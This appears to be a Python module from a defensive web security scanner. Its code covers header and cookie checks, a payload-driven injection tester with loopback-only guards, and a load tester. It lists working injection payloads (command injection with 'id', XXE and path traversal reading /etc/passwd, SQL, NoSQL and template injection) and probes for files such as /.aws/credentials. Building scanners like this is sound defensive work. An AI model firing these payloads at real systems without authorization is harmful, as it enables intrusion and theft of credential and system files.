"""Dynamic security testing (DAST) — a defensive, Strix-style live-app toolkit.

Three scanners that probe a *running* web app:

* :class:`WebSecurityScanner` — passive checks: missing security headers, weak
  cookie flags, version/info disclosure, exposed sensitive files.
* :class:`InjectionTester` — active checks: fires XSS / SQLi / SSTI / path-
  traversal / command-injection payloads and confirms a hit with evidence
  ("no PoC, no finding"), so there are no unvalidated false positives.
* :class:`StressTester` — concurrent load test: latency percentiles, throughput,
  error rate, and rate-limit (HTTP 429) detection.

**Authorization guard.** By default every scanner refuses any host that is not
loopback. Testing a remote target requires ``allow_remote=True`` *and* is your
responsibility — only scan systems you own or are explicitly authorized to test.
Everything uses the standard library (urllib), so it runs anywhere.
"""

from __future__ import annotations

import concurrent.futures
import statistics
import threading
import time
import urllib.error
import urllib.request
import uuid
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Dict, List, Optional
from urllib.parse import urlencode, urlparse, urlunparse

from .appsec import Finding

_LOOPBACK = {"127.0.0.1", "localhost", "::1", "[::1]"}


class AuthorizationError(RuntimeError):
    """Raised when a scan targets a non-loopback host without explicit opt-in."""


def _ensure_authorized(url: str, allow_remote: bool) -> None:
    host = (urlparse(url).hostname or "").lower()
    if host not in _LOOPBACK and not allow_remote:
        raise AuthorizationError(
            f"refusing to scan non-loopback host {host!r}; pass allow_remote=True "
            "only for targets you are authorized to test.")


def _fetch(url: str, timeout: float = 10.0, headers: Optional[dict] = None):
    h = {"User-Agent": "sentinel-dast/1.0"}
    h.update(headers or {})
    req = urllib.request.Request(url, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:  # nosec ssrf: DAST client fetches user-supplied targets by design
            return r.getcode(), dict(r.headers), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read().decode("utf-8", "ignore")


def _post(url: str, data: str, content_type: str = "application/xml", timeout: float = 10.0):
    req = urllib.request.Request(
        url, data=data.encode(), method="POST",
        headers={"User-Agent": "sentinel-dast/1.0", "Content-Type": content_type})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:  # nosec ssrf: DAST client fetches user-supplied targets by design
            return r.getcode(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")


class CallbackServer:
    """A loopback out-of-band (OOB) 'collaborator' — records tokens it is hit with.

    Used to *confirm* blind SSRF/XXE: we hand the target a unique callback URL; if
    the target's server-side request reaches this collaborator, the vulnerability
    is proven (no reflection needed). Binds to 127.0.0.1 only.
    """

    def __init__(self):
        self.hits: set = set()
        outer = self

        class _H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                outer.hits.add(self.path.strip("/"))
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), _H)
        self.port = self.server.server_address[1]
        self.base_url = f"http://127.0.0.1:{self.port}"
        self._thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def __enter__(self):
        self._thread.start()
        return self

    def __exit__(self, *exc):
        self.server.shutdown()
        self.server.server_close()

    def saw(self, token: str, wait: float = 1.0) -> bool:
        deadline = time.time() + wait
        while time.time() < deadline:
            if token in self.hits:
                return True
            time.sleep(0.02)
        return token in self.hits


# --------------------------------------------------------------------------- #
# 1 · Passive web security scanner
# --------------------------------------------------------------------------- #

SECURITY_HEADERS = {
    "content-security-policy": ("high", "CWE-1021", "Missing Content-Security-Policy (clickjacking/XSS mitigation)"),
    "strict-transport-security": ("medium", "CWE-319", "Missing HSTS; connections may downgrade to HTTP"),
    "x-frame-options": ("medium", "CWE-1021", "Missing X-Frame-Options; page can be framed (clickjacking)"),
    "x-content-type-options": ("low", "CWE-16", "Missing X-Content-Type-Options: nosniff"),
    "referrer-policy": ("low", "CWE-200", "Missing Referrer-Policy; referrer may leak"),
    "permissions-policy": ("low", "CWE-16", "Missing Permissions-Policy"),
}

SENSITIVE_PATHS = ["/.env", "/.git/config", "/config.php.bak", "/.aws/credentials"]


class WebSecurityScanner:
    def __init__(self, allow_remote: bool = False):
        self.allow_remote = allow_remote

    def scan(self, base_url: str) -> List[Finding]:
        _ensure_authorized(base_url, self.allow_remote)
        findings: List[Finding] = []
        code, headers, _ = _fetch(base_url)
        lower = {k.lower(): v for k, v in headers.items()}

        for h, (sev, cwe, msg) in SECURITY_HEADERS.items():
            if h not in lower:
                findings.append(Finding(
                    f"missing_header_{h}", "security_headers", cwe,
                    "A05:2021-Security Misconfiguration", sev, 0, msg,
                    f"Set the {h} response header.", base_url))

        # cookie flags
        for cookie in headers.get("Set-Cookie", "").split("\n") if headers.get("Set-Cookie") else []:
            c = cookie.lower()
            miss = [flag for flag in ("httponly", "secure", "samesite") if flag not in c]
            if miss:
                findings.append(Finding(
                    "insecure_cookie", "cookie", "CWE-1004",
                    "A05:2021-Security Misconfiguration", "medium", 0,
                    f"Cookie missing flags: {', '.join(miss)}",
                    "Set HttpOnly, Secure and SameSite on session cookies.",
                    cookie.strip()[:80]))

        # version / info disclosure
        if "server" in lower and any(ch.isdigit() for ch in lower["server"]):
            findings.append(Finding(
                "server_version_disclosure", "info_disclosure", "CWE-200",
                "A05:2021-Security Misconfiguration", "low", 0,
                f"Server header discloses version: {lower['server']}",
                "Suppress or genericise the Server header.", lower["server"]))

        # exposed sensitive files
        parsed = urlparse(base_url)
        for p in SENSITIVE_PATHS:
            url = urlunparse((parsed.scheme, parsed.netloc, p, "", "", ""))
            code, _, body = _fetch(url)
            if code == 200 and body.strip():
                findings.append(Finding(
                    "exposed_sensitive_file", "info_disclosure", "CWE-538",
                    "A05:2021-Security Misconfiguration", "high", 0,
                    f"Sensitive file reachable: {p}",
                    "Block access to dotfiles/backups at the web server.", p))
        findings.sort(key=lambda f: f.line)
        return findings


# --------------------------------------------------------------------------- #
# 2 · Active injection tester (validates with evidence)
# --------------------------------------------------------------------------- #

@dataclass
class ExploitResult:
    category: str
    param: str
    payload: str
    confirmed: bool
    evidence: str = ""
    cwe: str = ""
    owasp: str = ""

    def to_dict(self) -> dict:
        return {"category": self.category, "param": self.param, "payload": self.payload,
                "confirmed": self.confirmed, "evidence": self.evidence[:120],
                "cwe": self.cwe, "owasp": self.owasp}


# (category, cwe, owasp, [(payload, success_marker_in_response)])
INJECTION_TESTS = [
    ("xss", "CWE-79", "A03:2021-Injection",
     [("<svg/onload=alert(1)>", "<svg/onload=alert(1)>")]),
    ("sql_injection", "CWE-89", "A03:2021-Injection",
     [("1' OR '1'='1", "error in your SQL syntax"), ("1--", "error in your SQL syntax")]),
    ("ssti", "CWE-1336", "A03:2021-Injection",
     [("{{7*7}}", "49"), ("${7*7}", "49")]),
    ("path_traversal", "CWE-22", "A01:2021-Broken Access Control",
     [("../../../../etc/passwd", "root:x:0:0")]),
    ("command_injection", "CWE-78", "A03:2021-Injection",
     [("127.0.0.1; id", "uid=0("), ("127.0.0.1$(id)", "uid=0(")]),
    ("nosql_injection", "CWE-943", "A03:2021-Injection",
     [("{\"$ne\": null}", "auth bypassed"), ("' || '1'=='1", "auth bypassed"),
      ("[$ne]=x", "auth bypassed")]),
]


class InjectionTester:
    def __init__(self, allow_remote: bool = False):
        self.allow_remote = allow_remote

    def test(self, base_url: str, path: str, param: str,
             categories: Optional[List[str]] = None) -> List[ExploitResult]:
        _ensure_authorized(base_url, self.allow_remote)
        parsed = urlparse(base_url)
        results: List[ExploitResult] = []
        for cat, cwe, owasp, payloads in INJECTION_TESTS:
            if categories and cat not in categories:
                continue
            for payload, marker in payloads:
                url = urlunparse((parsed.scheme, parsed.netloc, path, "",
                                  urlencode({param: payload}), ""))
                _, _, body = _fetch(url)
                hit = marker in body
                results.append(ExploitResult(cat, param, payload, hit,
                                             evidence=body[:200] if hit else "",
                                             cwe=cwe, owasp=owasp))
                if hit:
                    break  # one confirmed PoC per category is enough
        return results

    def confirmed(self, base_url: str, path: str, param: str) -> List[ExploitResult]:
        return [r for r in self.test(base_url, path, param) if r.confirmed]

    # -- out-of-band SSRF (blind, confirmed via callback) ------------------ #

    def test_ssrf_oob(self, base_url: str, path: str, param: str) -> ExploitResult:
        _ensure_authorized(base_url, self.allow_remote)
        parsed = urlparse(base_url)
        with CallbackServer() as cb:
            token = uuid.uuid4().hex
            payload = f"{cb.base_url}/{token}"
            url = urlunparse((parsed.scheme, parsed.netloc, path, "",
                              urlencode({param: payload}), ""))
            _fetch(url)
            hit = cb.saw(token, wait=1.5)
        return ExploitResult(
            "ssrf", param, payload, hit,
            evidence=f"callback {token} received" if hit else "",
            cwe="CWE-918", owasp="A10:2021-Server-Side Request Forgery")

    # -- XXE over HTTP (POST an XML body with an external entity) ---------- #

    XXE_PAYLOAD = ('<?xml version="1.0"?>'
                   '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                   '<r>&xxe;</r>')

    def test_xxe(self, base_url: str, path: str = "/xml") -> ExploitResult:
        _ensure_authorized(base_url, self.allow_remote)
        parsed = urlparse(base_url)
        url = urlunparse((parsed.scheme, parsed.netloc, path, "", "", ""))
        _, body = _post(url, self.XXE_PAYLOAD, content_type="application/xml")
        hit = "root:x:0:0" in body
        return ExploitResult("xxe", "body", self.XXE_PAYLOAD, hit,
                             evidence=body[:200] if hit else "",
                             cwe="CWE-611", owasp="A05:2021-Security Misconfiguration")

    # -- IDOR: same request, different object id, no authorization -------- #

    def test_idor(self, base_url: str, path: str = "/account", param: str = "id",
                  ids=(1001, 1002)) -> ExploitResult:
        _ensure_authorized(base_url, self.allow_remote)
        parsed = urlparse(base_url)
        bodies = []
        for i in ids:
            url = urlunparse((parsed.scheme, parsed.netloc, path, "",
                              urlencode({param: i}), ""))
            code, _, body = _fetch(url)
            bodies.append((code, body))
        # confirmed if every object is returned (200 + owner marker) without auth
        # and the objects are distinct (i.e. we read *other* users' records).
        hit = (all(c == 200 and "owner=" in b for c, b in bodies)
               and len({b for _, b in bodies}) == len(bodies))
        return ExploitResult("idor", param, f"{param}={list(ids)}", hit,
                             evidence=bodies[0][1][:120] if hit else "",
                             cwe="CWE-639", owasp="A01:2021-Broken Access Control")

    # -- auth bypass / broken access control ------------------------------ #

    def test_auth_bypass(self, base_url: str, path: str = "/admin",
                         admin_marker: str = "ADMIN PANEL") -> ExploitResult:
        _ensure_authorized(base_url, self.allow_remote)
        parsed = urlparse(base_url)
        url = urlunparse((parsed.scheme, parsed.netloc, path, "", "", ""))
        code, _, body = _fetch(url)  # no credentials sent
        hit = code == 200 and admin_marker in body
        return ExploitResult("auth_bypass", "-", f"GET {path} (no auth)", hit,
                             evidence=body[:120] if hit else "",
                             cwe="CWE-862", owasp="A01:2021-Broken Access Control")

    # -- full battery against the bundled mock target layout -------------- #

    def full_scan(self, base_url: str) -> List[ExploitResult]:
        """Run every technique against the conventional mock-target endpoints.

        Returns one :class:`ExploitResult` per technique (reflected classes take
        their first confirmed payload). Intended for the bundled mock app.
        """
        out: List[ExploitResult] = []
        reflected = [
            ("/search", "q", "xss"),
            ("/user", "id", "sql_injection"),
            ("/render", "name", "ssti"),
            ("/file", "path", "path_traversal"),
            ("/ping", "host", "command_injection"),
            ("/nlogin", "pw", "nosql_injection"),
        ]
        for path, param, cat in reflected:
            hits = [r for r in self.test(base_url, path, param, [cat]) if r.confirmed]
            out.append(hits[0] if hits else
                       ExploitResult(cat, param, "", False, cwe="", owasp=""))
        out.append(self.test_ssrf_oob(base_url, "/fetch", "url"))
        out.append(self.test_xxe(base_url, "/xml"))
        out.append(self.test_idor(base_url, "/account", "id"))
        out.append(self.test_auth_bypass(base_url, "/admin"))
        return out


# --------------------------------------------------------------------------- #
# 3 · Stress / load tester
# --------------------------------------------------------------------------- #

@dataclass
class StressReport:
    url: str
    requests: int
    concurrency: int
    duration_s: float
    ok: int
    errors: int
    rate_limited: int
    throughput_rps: float
    latency_ms: Dict[str, float] = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "url": self.url, "requests": self.requests, "concurrency": self.concurrency,
            "duration_s": round(self.duration_s, 3), "ok": self.ok, "errors": self.errors,
            "rate_limited": self.rate_limited,
            "throughput_rps": round(self.throughput_rps, 1),
            "latency_ms": {k: round(v, 1) for k, v in self.latency_ms.items()},
        }


class StressTester:
    def __init__(self, allow_remote: bool = False):
        self.allow_remote = allow_remote

    def run(self, url: str, requests: int = 200, concurrency: int = 20,
            timeout: float = 10.0) -> StressReport:
        _ensure_authorized(url, self.allow_remote)
        latencies: List[float] = []
        ok = errors = rate_limited = 0

        def one():
            t0 = time.perf_counter()
            try:
                code, _, _ = _fetch(url, timeout=timeout)
                dt = (time.perf_counter() - t0) * 1000
                return code, dt
            except Exception:
                return None, (time.perf_counter() - t0) * 1000

        start = time.perf_counter()
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as ex:
            for code, dt in ex.map(lambda _: one(), range(requests)):
                latencies.append(dt)
                if code == 429:
                    rate_limited += 1
                elif code and 200 <= code < 400:
                    ok += 1
                else:
                    errors += 1
        duration = time.perf_counter() - start

        latencies.sort()
        def pct(p):
            if not latencies:
                return 0.0
            return latencies[min(len(latencies) - 1, int(p / 100 * len(latencies)))]

        return StressReport(
            url=url, requests=requests, concurrency=concurrency, duration_s=duration,
            ok=ok, errors=errors, rate_limited=rate_limited,
            throughput_rps=requests / duration if duration else 0.0,
            latency_ms={
                "p50": pct(50), "p90": pct(90), "p99": pct(99),
                "max": max(latencies) if latencies else 0.0,
                "mean": statistics.mean(latencies) if latencies else 0.0,
            },
        )
